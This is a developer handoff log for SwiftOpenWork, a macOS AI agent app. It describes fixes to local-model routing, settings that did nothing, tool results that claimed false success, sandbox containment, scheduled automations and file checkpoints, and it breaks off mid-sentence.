# Handoff

Written 2026-09-14, extended through 2026-09-19. Everything below is verified against the code and
against this machine, not remembered.

## Where things stand

| Repo | Pushed | Tests |
|---|---|---|
| SwiftOpenWork | `origin/main`; the module split, Swift 6 and test-host isolation landed in PR #18 | see *Verifying a change* |
| GrizzyBot | yes, `ecce520` | 538 |

Latest **published** release: **1.3.4 (build 7)**, notarised and stapled, installed in
`/Applications` on 2026-09-19 — see *Notarisation works (2026-09-19)* below. It carries PR #27
(`fetch_url` asks per site; chat history saved off the main thread), #29 (sub-agents go through
approval) and #30 (the safe-command allowlist no longer runs code or writes files).

> **The GitHub repository was renamed `Foscoe63/SwiftOpenWork` on 2026-09-19** (was
> `Foscoe63/OpenWork-swift`). GitHub redirects the old URLs, including the API URL that 1.3.2 and
> earlier check for updates (301 to `/repositories/1349995482/…`), so older installs still see new
> releases — until something else is created under the old name. 1.3.3 uses the new name.

> **The app was renamed SwiftOpenWork on 2026-09-16** (bundle ID `io.github.foscoe63.SwiftOpenWork`,
> was `ai.openwork.OpenWorkSwift`). Sections written before that say "OpenWork" and use the old
> paths; they are left as written. See *Renamed to SwiftOpenWork* below.

---

## What landed since the previous handoff

Every item the previous handoff listed under "Do these" is done, plus the add-ons it listed.

**The built-in provider was never the default, and was not always the built-in provider.**

Two sources of truth disagreed. `defaultProviders` marks the Apple Silicon MLX provider
`isDefault: true`; `AppSettings.default` named `ollama-local` — a separate app that need not be
installed, rather than the engine compiled into the binary. On this machine that Ollama provider
was *also* disabled, so `ProviderSelection.resolve` fell through to its "first enabled in array
order" rule and landed on **`openrouter-cloud`**. A cloud provider was answering turns the user
believed were local, with `omlx-local` enabled three slots further down the array. That is a
privacy fault, not a preference one.

Routing is on `kind`, never on id — `ProviderRouter.client(for:)` switches on `.omlx`/`.vmlx` — so
any provider of that kind reaches the in-process engine whatever it is called. That matters
because the ids have drifted: the seed creates `builtin-mlx-local`, existing installs carry
`omlx-local`, and `PersistenceManager` still holds migration code renaming `.omlx` providers to
"Apple Silicon (Built-in)". Four tests now pin `AppSettings.default` and `defaultProviders` to the
same provider, and assert a fresh install cannot resolve to a cloud one.

**`.omlx` means in-process MLX and nothing else now.** `NativeMLXService.streamChat` used to fall
through, on any in-process failure, to probing ports 1337, 8000, 8080, 11434, 1234 and 5243 and
letting whatever answered serve the turn — reported as if the built-in engine had produced it. A
turn sent to "Apple Silicon (Built-in)" could be answered by Ollama. The branch for builds without
MLX linked did the same thing *unconditionally*, so a misconfigured build looked like it was
working. Both now run in-process or fail with the reason. Ollama, LM Studio and the rest lost
nothing: they are separate providers in the picker, chosen deliberately, through their own clients.

The provider's stored `baseUrl` (`http://127.0.0.1:8000/v1`) is dead and always was — the
in-process path never reads `provider`. It is left in place because `ProvidersView` already hides
the URL field for `.omlx`, so nothing can edit it into something misleading. **`ProviderKind.omlx`
is named after the third-party oMLX *server* app** and still carries its display name and port;
the "Apple Silicon (Built-in)" label users see comes from the migration, not the kind. Worth a
rename if anyone touches this again.

**The test suite was resetting the developer's own settings.** This is the answer to a mystery
this handoff recorded twice without solving: *"settings.json had reverted to an Ollama default at
some point and was set back"*. Nothing reverted. `SandboxContainmentTests` saved a fresh
`AppSettings.default` through the real `PersistenceManager.shared` — the running app's own
`~/Library/Application Support/SwiftOpenWork/settings.json` — and its `defer` "restored" another
fresh default. **Every full test run reset the real settings to stock.** It now captures and
restores what was actually there, and `SettingsAreNotClobberedByTestsTests` plants a sentinel to
prove the suite leaves the file intact.

**Any test using `PersistenceManager.shared` is touching live configuration**, not a fixture. Read
first, restore exactly, or use a temporary directory. This one cost two rounds of hand-editing and
a false lead about the MLX default.

**GrizzyBot is the reference for this subsystem.** Its Local MLX is a provider in the ordinary
rail with an enable toggle, no base URL (`mlx://in-process` is a sentinel nothing dials), one
routing branch (`Store.defaultClient` → `MLXChatClient` vs `OpenAIChatClient`), the model id as an
absolute bundle path, and `GrizzyBotMLXBootstrap.install()` at launch gating on arm64 and
colocating the metallib. It has no server concept for MLX, which is why nothing can quietly
substitute for it. OpenWork now matches on the parts that matter; the bundle-path-as-id idea is
still worth stealing.

**Local MLX found the weights that were already on disk.** This is the one that mattered: the
search roots named `/Volumes/Storage/Models` literally, and that path exists on no machine here.
The real library is `/Volumes/Models/Models`. Every lookup therefore missed a complete 35GB
`mlx-community/Ornith-1.5-35B-A3B-8bit`, and the chat turn fell through to fetching all 37.7GB
from Hugging Face — behind a status chip reading `Loading MLX weights: 20%`, which is
indistinguishable from loading a model you already have. A saved session showed 541MB of one shard
out of eight. `knownMLXSearchRoots` now sweeps the mounted volumes for the usual library folder
names instead of asserting one path: discovery went from nothing to 13 installed models, and
Ornith loads in 5s and answers.

The note below about `customMLXModelsDirectory` in "Settings changed on this machine" was the
early warning and was read as housekeeping. It was stale — the field reads `""` — and nothing
compensated for that, because the hardcoded root was wrong too. **A setting recorded there as
load-bearing is worth re-verifying against the machine, not just against the code.**

**A chat turn no longer downloads anything**, matching GrizzyBot's `MLXLocalGenerator`, which only
ever loads a local directory URL. A model that does not resolve fails immediately with a message
naming every root it searched, any partial download it found, and the models that *are* ready to
run. The old failure could not tell the user that the folder holding their weights was never on
the list.

**One download mechanism.** `pullModel` shelled out to `huggingface-cli` — a Python tool that is
not installed on a stock Mac, so the Local Models Download button could not succeed here at all —
and wrote to `~/.openwork/mlx_models/<org>--<repo>/`, a *different* directory from the one the
chat path's own downloader used, reporting progress as three hardcoded numbers (5%, 40%, 100%).
It now calls the same in-process `HubClient`, writing to the hub cache that
`resolveLocalModelDirectory` already searches, with real byte progress and resume on retry.

**The load watchdog is a size-derived budget, not a stall timer.** Timing silence only works when
the work reports progress, and `loadContainer(from:)` takes no progress handler — so with the
download gone the watchdog saw one tick and then nothing, and would have called every load over
180s wedged, including the 46GB Llama that loads in ~220s and works. The budget is now
`max(180s, weightBytes / 25MB per s)` — 1508s for Ornith — with a 10s heartbeat so a long load
looks alive rather than hung. Overrunning still costs only the one turn; the load keeps running
and populates the cache.

**One model resident at a time**, plus a cap on `MLX.Memory.cacheLimit`, as GrizzyBot's generator
does. Loading a second multi-gigabyte checkpoint beside the first is the fastest way to exhaust
unified memory. That cap was half of physical memory and is now the user's own GPU budget ratio —
see "The GPU budget slider moved a number nothing read" below.

**Three tests were passing for the wrong reason.** `LocalModelResolutionTests` called the real
engine with the real root list, so it only passed on a machine whose scanned roots held no models.
Name matching returns nil on ambiguity, so once discovery worked, a real library made correct code
fail. `resolveLocalModelDirectory` and `scanInstalledModels` take an optional `roots:` so a test
can state exactly where to look. **Any test that touches the file system through these should pass
its own roots.**

**KV cache reuse actually engages.** `mergeToolMessagesIntoFollowingUser` is append-only now, so
the prefix only grows; and the comparison is a two-pointer walk that lets the session's *trailing*
generated reply have no counterpart in the caller's transcript. Verified live: zero divergence
rebuilds. The one remaining reset — `tool set changed` from catalog promotion — is correct and
unavoidable.

**Filesystem containment.** `canonicalPath` resolves symlinks (a link inside the workspace pointing
at `/etc` used to pass the prefix check); `terminal_command` redirects, `tee` and mutating commands
are gated by path plus `cwd`; `sandboxAgentFileSystem` defaults to true for *new installs only* —
an existing settings.json keeps its stored value, pinned by a test.

**Milestone-driven compaction.** A green `run_tests` / `build_project`, or a `git_status` reporting
a clean tree, now triggers compaction as well as token pressure. `isMilestone` requires the call to
have succeeded *and* the output to corroborate it, because a build can exit zero and still print
errors.

**Shortcuts and Siri.** `AskSwiftOpenWorkIntent` (then `AskOpenWorkIntent`) and `RunAutomationIntent` run the same `AgentRunner`.
The design question they turn on is settled: an unattended run refuses approvals instead of
awaiting them, records what it refused, and reports it. `requestApproval` returns an outcome rather
than a Bool so "the user said no" and "nobody was asked" cannot be conflated.

**Fork a conversation** from any message. Conversation state branches; the working tree does not,
and the fork says so by naming every file the discarded turns touched. `FileCheckpointStore` stays
turn-scoped on purpose.

**multi_edit** — several edits to one file, all or nothing, gated exactly like the tools it
replaces (approval, plan mode, checkpoint, sandbox, digest). **`run_tests(only_failing: true)`** —
failures parsed into identities (XCTest, go, pytest) and turned back into a narrowed command;
returns nil rather than a flag an unknown runner might ignore. **find_symbol** — declaration index
for Swift, Python, JS/TS, Go, Rust, Ruby, Java/Kotlin. **Session-wide change review** — read-only,
built from the transcript, with git supplying the diff.

**Settings.** 30 of 81 fields were never read. Sub-agent gating, agent defaults, editor font,
launch-at-login (real `SMAppService`) and the turn-finished sound are now wired; `streamResponses`,
`autoSaveIntervalSeconds`, `uiScalePercent` and `mlxContextLength` were removed. "Check for
Updates" no longer claims you are on the latest version without checking.

**Loop breaking.** `autoLoopBreakerEnabled` detected repetition and then waited for the stream to
finish — so a real 35B run spiralled for 219 seconds and its whole token budget with the setting
on. The stream is now cancellable from the streaming callback, the check watches reasoning as well
as visible text (reasoning models spiral where the visible text never grows), it is sampled every
24 tokens against the tail rather than re-split per token, and it tells the user it cut the answer
off. A turn that produced only reasoning also no longer renders as an empty bubble.

---

## What landed 2026-09-15

A sweep of all 57 settings fields for a control, a reader, and agreement between the two. Three
fixes, each verified live rather than by reading.

**The GPU budget slider moved a number nothing read.** `mlxGpuMemoryBudgetRatio` had a slider on
the MLX page, and its value rendered *in green* as "Safe GPU Memory Budget: 72.0 GB (75%)" there
and again in `ProvidersView`. Nothing read it. `NativeMLXService` capped MLX's buffer cache at a
hardcoded `cacheLimitFraction = 0.5`, and `assessCompatibility` judged which models fit against a
separate hardcoded `0.75`. The setting's default is 0.75, so the compatibility verdict agreed with
the readout exactly until someone moved the slider — which is why this survived the last sweep.
Same shape as the provider-default fault: a confident number with nothing behind it.

`applyMemoryPolicy(budgetRatio:)` and `assessCompatibility(requiredRAMGB:budgetRatio:)` now take
the ratio. **This changes runtime behaviour at the default**: MLX's cache limit goes from 50% to
75% of physical memory — 48GB to 72GB here — because 75% is what the UI has always claimed. Every
verdict the user sees is re-judged in `scanInstalledModels`, which is the one place holding both
the user's ratio and a list about to be displayed; `appState.localMLXModels` is fed only from
there. The curated catalog is a `static` with no access to settings and still bakes a verdict at
the shipped default, so **never display `curatedModels[i].compatibility` directly** — use
`judged(atBudgetRatio:)`. The slider re-judges on commit, not per step, because a rescan walks
every attached model volume.

Verified: `MLX.Memory.cacheLimit` read back `77309411328` after a real turn — 96GB × 0.75 exactly.

**The voice toggles gated nothing, and the feature they did not gate is real.** The previous
handoff filed `voiceInputEnabled`, `voiceSynthesisEnabled` and `speechVoiceIdentifier` as surface
for a planned feature. They are not: `ComposerView` draws a working mic button and
`MessageBubbleView` a working speak button, both unconditional. `speechVoiceIdentifier` defaulted
to Alex, had no control anywhere in the UI, and was never read — every utterance used
`AVSpeechSynthesisVoice(language: "en-US")`.

Both buttons now honour their toggles, `speak` resolves the stored identifier (falling back when
it names a voice this Mac has not downloaded), and the Extensions page has a voice picker with a
Preview button.

**Wiring a switch that did nothing can amount to deleting a feature.** Both toggles shipped
defaulting to `false`, so honouring a stored `false` literally would have removed the mic and
speak buttons from every existing install. A stored value from a switch that was never wired is
not a preference. Hence `AppSettings.settingsSchemaVersion` and
`PersistenceManager.applyMigrations`: version 2 turns both on for any file written before the key
existed, then stamps the version so a deliberate "off" sticks afterwards. **A migration must key
on the stored version, never on the values** — re-deriving "this looks unset" each load means the
user can never turn the setting off. There is a test for each direction.

Note the decoder subtlety: `settingsSchemaVersion` falls back to **1** when absent, not to
`def.settingsSchemaVersion`. Every other field in that initializer uses `def`; this one cannot, or
no existing file would ever migrate.

**Everything else on the sweep, in one pass.**

- **Two cards, not one.** `defaultTemperature`, `defaultMaxTokens` and `defaultReasoningEffort`
  seed the *new-agent sheet* — a turn reads `agent.temperature`, so dragging Temperature to 0.1
  for "precise coding" changed nothing about the agent answering. They sat under "Sampling
  parameters for autonomous LLM responses" beside Top-P and the penalties, which *are* read live
  per request. Split into "Defaults for New Agents" and "Sampling", with an **Apply to All
  Existing Agents** button so the values are reachable without creating an agent. The agent editor
  gained a Reasoning Effort picker — it was the only one of the three with no per-agent control.
- **Top-P reaches every provider.** It was read only by the in-process MLX path. Now sent by the
  OpenAI-compatible, Ollama and Anthropic paths too, and only when moved off 1.0 — 1.0 is a no-op,
  OpenAI advises against steering with temperature and top_p together, and Anthropic rejects
  `top_p` alongside extended thinking (hence the non-thinking branch only).
- **`contextCompactionThresholdTokens` got a control.** `AgentRunner` had always read it; the only
  way to change it was to hand-edit settings.json.
- **`useTranslucentBackground`** now puts an `NSVisualEffectView` behind the window, with the
  sidebar and inspector thinning their fills via `ThemeColors.paneBg(for:translucent:)`. Vibrancy
  needs both halves — an opaque pane over a material hides it completely, so wiring only the
  material would have looked like the switch was still broken.
- **`compactSidebar` and `showInterAgentCommunicationLogs`** had no control anywhere, not even a
  switch that did nothing. Both now have one and both do something: tighter sidebar rows and no
  workspace subtitle; the Agent Messages inspector tab hidden, with the selection moved off it so
  the inspector cannot render a tab the user just switched off.
- **`enableAgentCollaborationRoom`** gates the Multi-Agent Collaboration Room segment in AI
  Agents. It never gated `AgentCommunicationHub` and should not: that is delegation plumbing, not
  a room.
- **`AgentCommunicationHub`'s log had no readers and no bound.** `allMessages()` and
  `messages(for:)` are called from nowhere — the inspector reads `AppState.interAgentMessages`,
  a different store — so four call sites appended to an array nothing drained for the life of the
  process. Capped at 2000, oldest dropped.
- **`developerMode`** gates the Live Runtime Telemetry card and a new MLX Diagnostics card
  (resident models, the GPU budget in GB, and **every search root**). Those roots existed only
  inside a not-downloaded error message, which was on the "worth building next" list.
- **`verboseLogging`** had nothing to turn on: there was no verbose logging anywhere. `AppLog`
  now exists, gated on the setting, logging raw SSE payloads and tool call/result payloads to the
  unified log (`log stream --predicate 'subsystem == "io.github.foscoe63.SwiftOpenWork"'`; `ai.openwork` before the rename). `saveSettings` invalidates
  its cached gate, so the switch works without a relaunch.
- **`imageGenerationEnabled` reads the tools it writes.** It write-throughs to the `.mediaVision`
  category, so enabling one of those tools from the Tools page left the switch reading "off" while
  the tools were on — a switch reporting the opposite of the truth.
- **The version is the version.** The About row hardcoded "1.0.0" against a 1.1.0 release, and
  `project.yml` set no `MARKETING_VERSION`, so the bundle reported 1.0 as well. `MARKETING_VERSION`
  is now set and the row reads `CFBundleShortVersionString`. Verified: the built bundle reports
  1.1.0. **Bump it in `project.yml` on release.**
- **`autoCheckForUpdates` stopped promising.** The toggle toasted "Auto-check for updates enabled"
  beside a disabled button that correctly said checking is not implemented. Now disabled with a
  subtitle that says why.
- **Two hardcoded developer paths deleted.** `/Volumes/Storage/Models` was both the
  `customMLXModelsDirectory` default *and* a block in `AppState.loadAll` that wrote it into the
  user's settings whenever the path existed. The volume sweep is what finds the library; an empty
  field is not a gap to fill. The Updates page also loaded its icon from
  `/Volumes/Storage/Icons/…icns` with an `NSImage(named:)` fallback.

Verified after all of it: 13 models discovered with `customMLXModelsDirectory` empty, **6
compatibility verdicts change** between budget ratio 0.75 and 0.50, and a real turn answers while
rewriting none of settings.json, mcp_servers.json, providers.json or agents.json.

**Looking at the UI found a bug that compiling it could not.** Everything above was
compiler-verified, test-verified and exercised headlessly before the app was ever launched. It was
launched at the end, and the new voice picker rendered **completely blank**.

`speechVoiceIdentifier` shipped defaulting to `com.apple.speech.synthesis.voice.Alex` — an
*NSSpeechSynthesizer* identifier. Speech here goes through `AVSpeechSynthesizer`, whose
identifiers look like `com.apple.voice.compact.en-US.Samantha`; the default matched none of the
186 voices installed on this Mac. **A SwiftUI Picker whose selection matches no tag renders
nothing at all** — no placeholder, no first item, blank. Nobody could have noticed while the field
was unread, and the unit test for it passed: `preferredVoice()` correctly falls back, so speech
worked the whole time.

The default is now `""` (system default), the picker offers an explicit "System Default" row, and
`VoiceSpeechEngine.resolvedVoiceIdentifier` maps an unresolvable stored id to `""` so a legacy
value displays honestly. Normalised on read rather than migrated, because resolving a voice means
touching AVFoundation and `loadSettings` runs per turn.

**The lesson is the general one, not the voice one: a settings control verified only by the
compiler has not been verified.** Launch the app and look at the page.

**"Prefer local, never silently reach the network" is now the rule, and it was adopted
deliberately.** The previous handoff left this open on purpose, because it is a product decision
rather than a bug: `ProviderSelection.resolve` handed the turn to the first *enabled* provider in
array order when the selection was off, and on a typical configuration a cloud provider sits
earlier in that array than the local engine. Fixing `defaultProviderId` stopped it firing on a
fresh install; it stayed one toggle away for anyone who switched the built-in engine off.

A disabled **local** selection may now only be replaced by another **local** provider. When there
is none, `Resolution.mustRefuse` is true and the turn stops with a message naming the provider and
how to fix it, instead of answering over the network. A disabled *cloud* selection still falls
back as before — the rule is about not leaving local, not about never substituting.
`correctedSelectionId` follows the same rule at startup, or it would move the selection onto the
network before `resolve` ever got the chance to refuse.

Both turn entry points enforce it: `AppState.sendMessage` and `HeadlessAgentTurn.run`. The
headless path matters more, not less — a Shortcut or a Siri phrase runs with nobody watching, so
a silent substitution would never be noticed. `Resolution.overrodeDisabled` survives as a computed
property over the new `Outcome`, so the existing callers and tests are untouched.

**`loadSettings()` was a read that wrote.** Every branch ended in a write, including the
steady-state one, so it rewrote `mcp_servers.json` on every call — a synchronous atomic write,
under a lock, from the main thread among others — from 26 call sites including per turn, per tool
call, and six times over in `MCPProtocol`. Writes are now conditional on something having actually
changed; repairs and migrations still apply in memory on every load, so callers never see stale
values.

Proving it needed no instrumentation: `mcp_servers.json`'s mtime moved during a test that only
read settings. `LoadSettingsDoesNotWriteTests` pins it, and a real MLX turn now leaves
`settings.json`, `mcp_servers.json` and `providers.json` all untouched.

---

## What landed 2026-09-15 (second pass): the agent can see

Prompted by a question about what would make this a better app for vibe coding. The answer
came from the session's own evidence rather than from research: a settings picker was added,
402 tests passed, the compiler was happy, and it rendered **completely blank**. Only launching
the app and looking found it. The 2026 consensus agrees — VS Code 1.110 and Copilot both
shipped browser access for agents this year, and the visual feedback loop is the thing that
separates an agent that can check its work from one that cannot.

**Vision was declared everywhere and wired nowhere.** `supportsVision` on every `ModelInfo`,
`isVLM` detected from each model's `config.json` at discovery, `attachments` with a `mimeType`
on every `ChatMessage`, a "Vision OCR" extension in the UI — and every provider serialized
`msg.content`, a `String`, and nothing else. Exactly the fault class of the settings sweep
above, one layer up. `ImageTransport` now carries images to all four providers.

Two things to know before touching that path:

- **A `tool` message may not carry image blocks in the OpenAI schema**, so pixels follow as
  their own user turn. Anthropic *does* allow them inside `tool_result`, so there they stay
  attached to the call that produced them. The shapes genuinely differ; do not unify them.
- **`mergeToolMessagesIntoFollowingUser` rebuilds messages**, so it drops attachments unless
  told not to. The transport was undone one function later until that was fixed.

**`accessibility_tree` is the one to reach for first.** It reads a window as text: ~20× cheaper
than a screenshot, it states control *values* a screenshot only implies, and it works with a
**text-only model**. A vision-only feedback loop would abandon local MLX exactly where this app
is strongest. `screenshot_window` is for layout and colour.

Both need TCC permissions **per binary**, so the xctest runner has neither and cannot verify
them live — they are covered by their failure path, which names the exact System Settings pane.
To exercise them for real, grant Screen Recording and Accessibility to the built `SwiftOpenWork.app`
and drive them from the app. Screen Recording is only re-read at launch, so relaunch after
granting.

**Two bugs came out of running this against a real model, neither of which any test caught.**
This is the feature justifying itself on its first outing.

- **`run_app` terminated the app it launched**, so the two tools it exists to feed —
  `screenshot_window` and `accessibility_tree` — structurally could not see it. Ornith hit that
  within one turn: it launched the app, read "then terminated", and reasoned it would have to
  relaunch before inspecting anything. It now leaves the app **running by default**, with
  `quit_app` to clean up.
- **`AgentRunner` discarded a failing tool's entire `output`**, keeping only `error`. Any tool
  that fails *and* explains why lost the explanation. `run_app` returned `error: nil` for an app
  that exited non-zero, so the model received the literal string `Error: unknown error` with the
  exit code, stdout and stderr all thrown away. `describeToolResult` now keeps both, and a
  failure with no reason says so instead of claiming the reason is unknown. **This affected every
  tool, not just the new ones.**

**`run_app` closes the loop `build_project` and `run_tests` leave open.** Note the gotcha it
exists to remove: a child process started from a shell dies with that shell, so a hand-rolled
launch looks successful and is gone before anything inspects it.

**`git_commit` is confined to agent worktrees, and that is the whole design.** This is not the
session-wide undo that was rejected below — it is the opposite. Commits on a branch in a
directory of its own are additive history that cannot rewrite anything the user wrote. The
pinning test asserts that committing on the user's own checkout is refused *and* their log is
unchanged. Worktrees live *beside* the repo, never inside it, or the parent's status, build and
file search pick them up.

**Sub-agents take no tools** (`tools: []`) and never touch the filesystem — worth knowing before
anyone assumes worktrees isolate them. They are advisory LLM calls; they now run through a task
group instead of a serial loop, results applied in delegation order so the transcript is stable.

---

## What landed 2026-09-15 (third pass): sub-agents that do the work

**Sub-agents were theatre, and now are not.** `agent_spawn` built a `SubAgentTask`, returned
"Spawned sub-agent […] to execute task", and ran nothing. Auto-delegation made one call with
`tools: []` and a 512-token ceiling. `SubAgentExecutor` gives them a real ReAct loop with tools,
iteration and wall-clock budgets, unattended approvals, and a git worktree each.

**The parent now reads the result.** This was the actual defect: reports reached the Sub-Agent
Tree and the Agent Messages log and stopped — `workingMessages` never saw them, so the parent
answered as though nothing had been delegated. Work was done, displayed, and ignored by the only
participant who could act on it. Check this first if sub-agent output ever looks ignored again.

**`allowedToolIds` was a third dead control, and it bites anything that starts honouring it.** It
is shown in the Agents editor and stored on every agent; nothing read it until now. Its seeded
value predates most of the catalog — no grep, no edit_file, no build_project, no run_tests — so
respecting it as found would have crippled every sub-agent. The untouched seed is migrated to
empty ("everything the workspace allows"); a deliberately changed list is left alone. **Same shape
as the voice toggles: a value stored by a control that did nothing is not a preference.**

**Reasoning leaking into the answer is fixed, and the handoff's guessed fix was wrong.** It said
to "consume MLX's own reasoning channel where the model exposes one". There is no such channel —
`Generation` here is `.chunk`, `.info`, `.toolCall`. The mechanism is in the chat template: Ornith's
generation prompt ends with a bare `{{- '<think>\n' }}`, so the model begins generating *inside* a
block it never opened, and is meant to close with `</think>`. When it forgets, the text carries no
tags at all and `AssistantContentSanitizer` correctly refuses to guess. `ReasoningChannel` reads
the template, knows the block was pre-opened, and routes accordingly — determinate, not a heuristic.
Verified live: 212 characters of reasoning filed as reasoning, visible output exactly `SPLIT OK`.

**`NoDeadSettingsTests` is the sweep, as a test.** Two passes of `AppSettings` found ~20 switches
that changed a value and nothing else. A sweep is something you do once and stop doing, so it now
runs every build: every field needs a reader *and* a control, or an entry in `knownDead` with a
stated reason. It caught `autoCheckForUpdates` immediately.

---

## What landed 2026-09-15 (fourth pass): the surfaces that were not settings

A vibe-coding review of the app asked what still separated it from a tool you would drive daily.
The answer, again, was **surface built ahead of substance** — but this time in places
`NoDeadSettingsTests` structurally could not see, because none of them were fields of
`AppSettings`. Two sweeps had run under the rule "nothing ships with a control until something
reads it" and both walked straight past the largest dead surface in the app.

**The whole Automations section did nothing on a schedule.** `AutomationTriggerType` declares five
triggers — manual, scheduled, onStartup, onSessionCreated, fileWatch. Exactly one, `.manual`, was
consumed anywhere in the codebase, and only to decide whether to *draw* a next-run line. The card
rendered "Next run: Tomorrow at 9:00 AM" in purple beside a clock icon, computed by a display
heuristic in the view, above a scheduler that did not exist. The seeded automations shipped with
`"Daily at 9:00 AM"` and `"On File Change"`. The only paths that ever ran one were the Run button
and the Shortcuts intent — both manual.

Now: `AutomationSchedule` parses the free-text schedule (`Daily at 9:00 AM`, `Every 30 mins`,
`Weekly on Monday at 8am`, `Monthly on the 1st`, five-field cron), `CronExpression` implements cron
properly including the both-day-fields-are-OR rule, and `AutomationScheduler` fires all four
non-manual triggers. The view now asks `AutomationSchedule` for its next-run text, so **the screen
and the scheduler cannot disagree** — that is the point of the refactor, not a tidy-up.

Four properties worth keeping if this is touched again:

1. **`parse` returns nil rather than guessing**, and the card says "will not run" in orange. The
   old heuristic ended in `return schedule`, echoing "Every other Tuesday" back as if it were a
   time.
2. **Near-miss periods are refused, not rounded.** "Every other Tuesday" contains "tue"; a weekday
   reader turns it into a weekly schedule that fires *twice as often as asked*, and nothing would
   ever say so. `unsupportedQualifiers` refuses "other", "biweekly", "first Monday", "30 seconds",
   "quarterly". A test caught this, reading did not.
3. **A bare number is a count, not a clock time.** Without that rule "every 2 weeks" — which the
   parser cannot honour — came back as `.dailyAt(hour: 2)`.
4. **Next fire is computed from `lastRunAt`, never from now.** From now, an automation is
   permanently one interval away from its first run and never fires at all. Firing stamps
   `lastRunAt` with *now*, so a weekend of missed hourly runs collapses to one overdue run rather
   than forty-eight queued turns.

Scheduled runs go through `HeadlessAgentTurn`, the path Shortcuts already used, so there is one
execution path rather than two — and it gained an `agentId` parameter, because it ran
`appState.currentAgent` and an automation stores a `targetAgentId`. A scheduled prompt was going to
run against whichever agent the user last had selected in the window.

**`generate_image` was theatre and is deleted.** It wrote a fixed SVG — gradient, circle, square,
triangle — with the prompt truncated to 60 characters stamped underneath as a caption, then
returned `success: true` and "🎨 Generative Media Created". Nothing about the output depended on
the prompt. It was enabled by default, so a model asked to draw a chart got the same circle every
time and told the user it had worked. There is no local image generator to route it to; the honest
tool is the one the agent already has, which is to write the SVG itself with `file_write`. The
`case` is kept, returning an error that says where to go, because agents carry saved tool lists —
and `loadTools` now strips retired tools, since `defaultTools` seeds a list and never prunes one.

**`mlx_vision_describe` now uses a vision model.** It was Apple Vision OCR behind a name and a
description claiming "local MLX vision models", and the `prompt` in its schema was never read. An
image with no text returned "Image verified. No embedded text detected" — which a model reads as
success. It now sends the image down the same path a chat attachment takes, so it works exactly
where vision works, and **falls back to OCR only with the fallback stated in the output**. It does
not quietly answer a "what does this show" question with OCR text. `image_analyze` stays OCR and
now says so in its name and description.

**`AgentCommunicationHub` is deleted, and deleting it exposed two real bugs.** The hub was a second
message log with four writers and no readers — the Agent Messages inspector reads
`AppState.interAgentMessages`, written by a different callback. The previous pass capped the hub at
2000 messages and moved on, which tidied a dead store instead of noticing what it was hiding: the
sub-agent **reply** message went to the hub *only*, and `ToolExecutionResult.createdAgentMessage`
— set by `agent_message` — had no reader at all. So a sub-agent's delegation appeared in the
inspector and its answer never did, and every message an agent sent with `agent_message` was
reported as sent and displayed nowhere. Both now go through `onInterAgentMessage`.

**Watch folders fabricated a clean bill of health on failure.** `triggerManualScan`'s `catch` block
wrote "All monitored items verified. No syntax regressions or permission errors detected." into the
artifact whenever the provider threw — a finding nothing had checked, filed under the agent's name,
in the place the user goes to read what the agent found. It now writes the failure and its reason,
and the artifact subtitle says the run failed.

**"Run now" reported success before the turn started.** It wrote `lastStatus = "Completed"` on the
line after `sendMessage`, which returns immediately — and returns *early* when a turn is already
generating. So a run rejected outright was filed as a success. `sendMessage` gained an
`onFinished` callback, and every trigger now records through `recordAutomationRun`.

### The rule, generalised

`NoDeadSettingsTests` checked fields. `NoDeadFeaturesTests` now also checks:

- every case of `AutomationTriggerType` is consumed outside the model, **and** named in
  `AutomationScheduler`;
- every declared tool has a `case` in `ToolExecutionEngine`;
- retired tools are neither seeded nor left in saved installs;
- the vision tools' descriptions match what they do.

`HitTestableButtonSweepTests` pins the borderless-button rule with a named exemption list, because
the previous version of that rule lived in this document and did not get done.

**The lesson is the scope of the sweep, not the findings.** Every one of these was a promise made
by a piece of UI or a tool description that no code kept. Ask of any user-visible surface — an
enum case, a tool description, a trigger, a status string — *what reads this, and what happens if
nothing does?*

---

## What landed 2026-09-15 (fifth pass): the loop you actually sit in

Started from "the sidebars do not come back the way I left them" and turned into the daily-driver
gap. 503 → 595 tests, all green, and the app was launched and driven after each piece rather than
only compiled.

### Window layout, and a regression worth the warning

Frame, sidebar width, inspector width, open/closed inspector, destination, settings tab, last
workspace and session all persist through `WindowLayoutStore`. The first fix for that **broke
resizing**: with `HSplitView` the panes grew past their content and left black gutters down both
sides of the chat. `MainView` is now a plain `HStack(spacing: 0)` with its own drag handles —
`clipped()` on each pane, `layoutPriority(1)` on the centre so it absorbs the slack, and the
handle's `Rectangle` wrapped in a `Color.clear` so the whole strip is grabbable rather than the
one-pixel line that is drawn.

**`HSplitView` cannot be made to persist widths reliably**, which is why it is gone. It negotiates
sizes itself and treats an `idealWidth` as a suggestion, so a restored width silently drifts. Do
not reintroduce it here; the custom split is the third attempt and the first that holds.

### Durable checkpoints — and yes, this reverses a recorded decision

"Session-wide undo" is listed below under *Explicitly decided against*, on the grounds that an
agent able to silently revert ten turns of your work is worse than one that cannot revert at all.
**That argument is about the agent, and it still stands** — `revert_changes` and
`FileCheckpointStore` remain turn-scoped, and the agent has no reach past the turn it is running.

What was wrong was treating it as settled for the *user*. A person who opens their own transcript,
picks a point, and is shown the exact list of files that will be rewritten or deleted before
anything is written is not doing the thing that was rejected. And they need the history to outlive
a relaunch, because "I'll sort this out later" is precisely when it does not.

So `SessionCheckpointStore` (an actor, `Sources/Storage/`) seals one checkpoint per finished turn:
the prior contents of every file that turn touched. Contents are content-addressed by SHA-256, so
a file edited in twenty turns costs twenty digests rather than twenty copies; 40 checkpoints per
session, pruned oldest-first, with blob GC after every prune and restore.

Four properties to preserve if this is touched:

1. **Restoring replays the *oldest* recorded state of each path from the target checkpoint
   forward.** Undoing three turns has to land on v1, not v3 — replaying the most recent baseline
   would undo one turn and claim to have undone three. There is a test named for exactly that.
2. **Undone checkpoints are deleted afterwards.** Leaving them offers a second restore to a state
   with no baseline on either side of it.
3. **A file too large or too binary to snapshot is reported as unrecoverable, never skipped.** A
   restore the user believes was total, but was not, is worse than one that admits a gap. Both the
   plan and the outcome carry the list.
4. **Headless turns seal too** (`HeadlessAgentTurn`). An automation that rewrote six files at 3am
   is the run you most want to be able to undo.

`FileCheckpointStore.baseline()` is the seam between the in-memory turn window and the durable
store. UI is `RestoreFilesSheet`, reached from the message context menu; `AppState` holds
`restorableMessageIds` so the transcript can decorate rows without a call per row.

### `AgentWorktree` was blocking the main thread, and that is why the tests "hung"

Found while chasing a test run that finished its assertions and then sat forever, occasionally
appearing to re-run itself. `AgentWorktree.git()` built a `Process` and called `waitUntilExit()`
**on whatever thread called it**, which via `SubAgentExecutor` and an `AgentRunner` closure was the
